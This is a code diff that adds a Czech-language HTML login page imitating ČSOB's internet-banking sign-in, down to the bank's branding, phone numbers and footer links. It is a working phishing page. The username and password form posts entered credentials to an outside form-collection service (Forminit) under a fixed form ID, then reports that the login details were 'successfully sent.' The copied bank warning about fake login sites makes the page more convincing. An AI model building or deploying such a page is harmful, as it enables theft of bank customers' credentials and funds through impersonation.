@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Přihlášení do internetového bankovnictví</title>
+    <!-- Include Forminit SDK -->
+    <script src="https://forminit.com/sdk/v1/forminit.js"></script>
+    <style>
+        .toggle-password {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 24px;
+            height: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            margin-left: 5px;
+            padding: 0;
+            opacity: 0.6;
+            transition: opacity 0.2s;
+        }
+
+        .toggle-password:hover {
+            opacity: 1;
+        }
+
+        .toggle-password svg {
+            width: 20px;
+            height: 20px;
+            fill: #00569c;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ebf3f7;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        a {
+            color: #00569c;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        header {
+            background-color: #fff;
+            padding: 15px 40px;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+        }
+
+        .header-contact {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 12px;
+            color: #333;
+        }
+
+        .header-contact svg {
+            width: 14px;
+            height: 18px;
+            fill: #00569c;
+        }
+
+        .header-contact .phone {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.2;
+        }
+
+        .lang-switch {
+            margin-left: 20px;
+            color: #00569c;
+            font-size: 13px;
+        }
+
+        main {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .content-wrapper {
+            width: 100%;
+            max-width: 850px;
+        }
+
+        .page-title {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .page-title svg {
+            width: 45px;
+            height: 35px;
+            fill: #00569c;
+        }
+
+        .page-title h1 {
+            color: #00569c;
+            font-size: 24px;
+            font-weight: normal;
+        }
+
+        .info-box {
+            background-color: #f6f9fc;
+            border: 1px solid #c5d7e8;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .info-content {
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #333;
+        }
+
+        .info-content svg {
+            width: 20px;
+            height: 20px;
+            fill: #00569c;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .btn-blue {
+            background-color: #2b74a7;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .btn-blue:hover {
+            background-color: #1e5a85;
+        }
+
+        .panels-container {
+            display: grid;
+            grid-template-columns: 1fr 0.7fr;
+            gap: 20px;
+            align-items: stretch;
+        }
+
+        .left-column {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .panel {
+            background-color: #fff;
+            box-shadow: 0 1px 5px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .login-panel {
+            flex: 1;
+        }
+
+        .tabs {
+            display: flex;
+            background-color: #f5f5f5;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px;
+            font-size: 13px;
+            cursor: pointer;
+            color: #00569c;
+        }
+
+        .tab.active {
+            background-color: #fff;
+            color: #333;
+            border-top: 2px solid #fff;
+            position: relative;
+        }
+
+        .form-content {
+            padding: 30px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-row {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .form-row label {
+            width: 120px;
+            font-size: 12px;
+            color: #333;
+        }
+
+        .input-group {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+            border: 1px solid #a9a9a9;
+            padding: 5px 8px;
+            background-color: #fff;
+        }
+
+        .input-group input {
+            border: none;
+            outline: none;
+            width: 100%;
+            font-size: 14px;
+        }
+
+        .form-actions-row {
+            margin-top: 15px;
+        }
+
+        .actions-left {
+            width: 120px;
+            flex-shrink: 0;
+        }
+
+        .actions-left a {
+            font-size: 13px;
+        }
+
+        .actions-right {
+            flex-grow: 1;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .btn-orange {
+            background-color: #f15d22;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-orange:hover {
+            background-color: #d8521d;
+        }
+
+        .security-panel {
+            border-top: 3px solid #cc0000;
+            padding: 25px;
+            justify-content: space-between;
+        }
+
+        .security-header {
+            color: #cc0000;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .security-body {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .security-text {
+            font-size: 12px;
+            line-height: 1.5;
+            max-width: 65%;
+        }
+
+        .security-text a {
+            display: block;
+            margin-top: 5px;
+            font-size: 12px;
+        }
+
+        .security-icon {
+            width: 80px;
+            height: 80px;
+        }
+
+        .security-footer {
+            padding-top: 20px;
+            font-size: 12px;
+            color: #333;
+        }
+
+        .security-footer span {
+            color: #cc0000;
+            font-weight: bold;
+        }
+
+        .first-login-link {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+        }
+
+        footer {
+            border-top: 1px solid #d1dfe8;
+            padding: 30px 20px;
+            background-color: #ebf3f7;
+            display: flex;
+            justify-content: center;
+        }
+
+        .footer-inner {
+            width: 100%;
+            max-width: 850px;
+            display: grid;
+            grid-template-columns: 1fr 0.7fr;
+            gap: 20px;
+            align-items: start;
+            font-size: 11px;
+            color: #666;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 60px;
+        }
+
+        .footer-column {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        #form-status {
+            margin-top: 12px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        @media (max-width: 768px) {
+            .panels-container {
+                grid-template-columns: 1fr;
+            }
+            .footer-inner {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+            .header-contact .lang-switch {
+                margin-left: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-contact">
+            <svg viewBox="0 0 24 24">
+                <path d="M16 1H8C6.9 1 6 1.9 6 3v18c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 18H8V5h8v14z"/>
+            </svg>
+            <div class="phone">
+                <span>Kontakty</span>
+                <span>495 300 300</span>
+            </div>
+            <a href="#" class="lang-switch">EN</a>
+        </div>
+    </header>
+
+    <main>
+        <div class="content-wrapper">
+            
+            <div class="page-title">
+                <svg viewBox="0 0 48 48">
+                    <path d="M4 12h30v20H4z" fill="none" stroke="#00569c" stroke-width="2"/>
+                    <path d="M2 32h34v4H2z" fill="#00569c"/>
+                    <rect x="36" y="18" width="10" height="18" rx="1" fill="none" stroke="#00569c" stroke-width="2"/>
+                    <circle cx="41" cy="32" r="1.5" fill="#00569c"/>
+                </svg>
+                <h1>Ověření přihlašovacích údajů</h1>
+            </div>
+
+            <div class="info-box">
+                <div class="info-content">
+                    <svg viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="11" fill="#00569c" />
+                        <path d="M11 7h2v2h-2zm0 4h2v6h-2z" fill="#fff"/>
+                    </svg>
+                    <p>Pro správnou funkčnost našich aplikací je třeba, abyste používali aktuální verzi podporovaného webového prohlížeče. Aktualizujte svůj webový prohlížeč a předejdete tak možným nepříjemným komplikacím.</p>
+                </div>
+                <button class="btn-blue">Rozumím</button>
+            </div>
+
+            <div class="panels-container">
+                
+                <!-- ĽAVÝ STĹPEC (Formulár s Forminit SDK) -->
+                <div class="left-column">
+                    <div class="panel login-panel">
+                        <div class="tabs">
+                            <div class="tab active">Uživatelské jméno a heslo</div>
+                        </div>
+                        
+                        <div class="form-content">
+                            <form id="contact-form" enctype="multipart/form-data">
+                                <div class="form-row">
+                                    <label>Uživatelské jméno</label>
+                                    <div class="input-group">
+                                        <input type="text" name="fi-text-username" autocomplete="off" placeholder="" required>
+                                    </div>
+                                </div>
+                                
+                                <div class="form-row">
+                                    <label>Heslo</label>
+                                    <div class="input-group">
+                                        <input type="password" name="fi-text-heslo" id="passwordInput" required>
+                                        <button type="button" class="toggle-password" onclick="togglePasswordVisibility()" title="Zobrazit heslo">
+                                            <svg class="eye-icon" viewBox="0 0 24 24">
+                                                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                </div>
+                                
+                                <div class="form-row form-actions-row">
+                                    <div class="actions-left">
+                                        <a href="#">Pomoc s přihlášením</a>
+                                    </div>
+                                    <div class="actions-right">
+                                        <button type="submit" class="btn-orange">Přihlásit</button>
+                                    </div>
+                                </div>
+
+                                <p id="form-status"></p>
+                            </form>
+                        </div>
+                    </div>
+
+                    <div class="first-login-link">
+                        <a href="#">Jak na první přihlášení</a>
+                    </div>
+                </div>
+
+                <!-- PRAVÝ PANEL -->
+                <div class="panel security-panel">
+                    <div>
+                        <div class="security-header">Pamatujte na bezpečnost:</div>
+                        <div class="security-body">
+                            <div class="security-text">
+                                Kyberzločinci zneužívají internetové vyhledávače a nabízí falešné přihlašovací weby.
+                                <a href="#">Zjistit více</a>
+                            </div>
+                            
+                            <div class="security-icon">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+                                    <circle cx="50" cy="50" r="45" fill="#cc0000"/>
+                                    <path d="M20 90 Q50 20 80 90" fill="#222"/>
+                                    <circle cx="50" cy="45" r="14" fill="#fcdbb6"/>
+                                    <path d="M35 45 Q50 15 65 45" fill="#111"/>
+                                    <rect x="30" y="70" width="40" height="25" fill="#888" rx="2"/>
+                                    <rect x="35" y="73" width="30" height="15" fill="#aaa"/>
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="security-footer">
+                        NONSTOP Bezpečnostní linka <span>495 800 111</span>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-inner">
+            <div class="copyright">©</div>
+            <div class="footer-links">
+                <div class="footer-column">
+                    <a href="#">www.csob.cz</a>
+                    <a href="#">O skupině ČSOB</a>
+                    <a href="#">Cookies a podmínky používání</a>
+                    <a href="#">Ochrana osobních údajů</a>
+                </div>
+                <div class="footer-column">
+                    <a href="#">Provozní informace</a>
+                    <a href="#">Průvodce bezpečností</a>
+                    <a href="#">Nápověda</a>
+                    <a href="#">Archiv zpráv</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Forminit SDK Integration
+        const forminit = new Forminit();
+        const FORM_ID = "kz0npmhv3d9";
+
+        document.getElementById("contact-form").addEventListener("submit", async (e) => {
+            e.preventDefault();
+
+            const formData = new FormData(e.target);
+            const { data, error } = await forminit.submit(FORM_ID, formData);
+
+            const status = document.getElementById("form-status");
+
+            if (error) {
+                status.style.color = "#cc0000";
+                status.textContent = error.message;
+                return;
+            }
+
+            status.style.color = "#2b74a7";
+            status.textContent = "Přihlašovací údaje byly úspešně odeslány!";
+            e.target.reset();
+        });
+
+        // Toggle Password Visibility
+        function togglePasswordVisibility() {
+            const passwordInput = document.getElementById('passwordInput');
+            const eyeIconPath = document.querySelector('.eye-icon path');
+
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeIconPath.setAttribute('d', 'M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.28 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78 3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z');
+            } else {
+                passwordInput.type = 'password';
+                eyeIconPath.setAttribute('d', 'M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z');
+            }
+        }
+    </script>
+</body>
+</html>
